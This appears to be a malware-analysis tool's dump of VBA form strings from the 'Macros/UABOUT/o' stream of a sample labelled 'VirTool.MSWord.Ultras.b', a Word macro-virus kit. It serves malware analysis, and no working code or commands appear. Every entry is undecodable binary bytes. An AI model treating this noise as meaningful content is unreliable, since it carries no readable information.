VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
e���@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
}���``�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������::=DDHOOS������ootqq|lm�hi�������������UV�QS�MO�������������=@�:=�7:�48�������-1�+/�)-�^a����������]`�(,�)-�+/�������������:>�?B�CF�vx�������������fg�mm�ppw������;;>))+
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������������韟����  �
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������002++-'')YY[���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@@N����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
D����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
r���  �
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�  �����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����``�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
PPS���������������88;CCFMMQ������llrrr{nn�jj�������������VX�RT�OQ�������������>A�<?�9<�6:�������/3�-1�,0�_c����������_b�+/�,0�.2�������������>A�BE�GJ�yz�������������jj�pp|hhn������224
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������++-&&(""#VVW���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@@W����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
P����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�  ����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������00
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
"������������������77:AAEKKO������jjorryookk�������������XY�TV�PS�������������@C�>A�;>�8<�������15�03�.2�be����������be�.2�04�26�������������BE�FI�KM�|}�������������nn�nnu^^c������((*
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
i����������``�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ǟ�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������&&(!!#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
RRS���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#@@`����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
\����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�PP����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0���������������������669@@CJJN����hhmqqwpp}ll�������������Y[�VW�RT�������������BE�@C�=@�:>�������47�26�15�dg����������dg�25�37�59�������������FH�JL�OQ���������������pqzeekTTX������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
}�������00�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ο��������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������!!#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
NNO���


-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
.@@h����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
h����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�00�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��  �
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�PP�������  �
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<@@b������������������������668??BIIL}}����ffkppuqq|mm�������������[\�WY�TV�������������DG�BE�?B�=@�������6:�58�47�fi����������gj�59�7:�9<�������������JL�NP�SU����������������llr[[`JJN������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
G�ȿ�����``�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�  �������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
JJK���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9@@q����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
s����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
D������������������������������558>>BHHK}}����ddinnsqq{nn�������������\]�YZ�UW�������������FI�DG�AD�?B�������9<�8;�7:�hk����������il�9<�;>�=@�������������NP�RT�WX����������������bbgQQU??C������		

-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�``����������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
GGG���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
C@@x����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
~����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Jpp����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������558>>AGGK||���cchllqrrzoo������������]_�Z\�WY�������������HK�FI�CF�AD�������<?�:>�:=�km����������ln�<@�>A�AD�������������RS�VX�[\����������������XX\GGJ558������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
o������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�00����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
DDD���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
"������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
M@@������@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����  �
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������``�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
D����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������558>>AGGJ{{���aafjjpqqxop}�����²�ŉ��_`�\]�YZ������ѧ�����KM�HK�FH�DF�������>A�=@�=@�mp����������oq�@C�BE�DG���컼ᦧԓ��VW�Z\�_`�wx���·����톆�MMQ<<?++-������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��域����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
AAA���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
V@@����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@��������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������669>>AGGJ{{~���``eiinqqwpp|���jj�fg�cd�`a�]^�Z\�WY�TV�RT����MO�JM�HK�FI�������AD�@C�@C�pr����������qt�DG�FI�HK����z|�RT�VW�Z[�^_�cd�hi�mn�ppw���~~�CCF225!!"������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@����00�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�``����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@@B���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
^@@����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Կ�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�  ����������pp�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������77:??BGGJ{{~���__dhhmppvqq|���kk�hh�de�ac�_`�\]�YZ�VX�TU����OQ�MO�JM�HK�������DG�CF�CF�rt����������tw�HJ�JL�LO����}�VW�Z[�^_�bc�gh�lm�qqzhhm���wwz99<((*
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
뿿����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������GGHDDD@@Appu���@@V@@]@@d@@k������@@�@@�@@�pp����@@�@@�@@�@@�@@�@@�@@�@@�@@����@@�@@�@@�@@�@@�@@�꿿�������������@@�@@�@@�@@�@@�pp��������������00\
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
  )aaa���������������������jjlppruux���������������������������������������������������}~�{}�z{�xz�������uw�uw�twƗ��������������yz�z|�|}������Ƀ�������������������������ߓ��bbeVVWJJJ������@@|@@�@@�@@�@@�@@�pp����������@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�PP����������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�Qlt
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������翿˿�������������������������������������������������������������������������������������������������������������������������������������������������������������������鿿���������������������������������������������������������������������������������������������������������������������������������������������������⿿ٿ��������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��ȿ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
z������
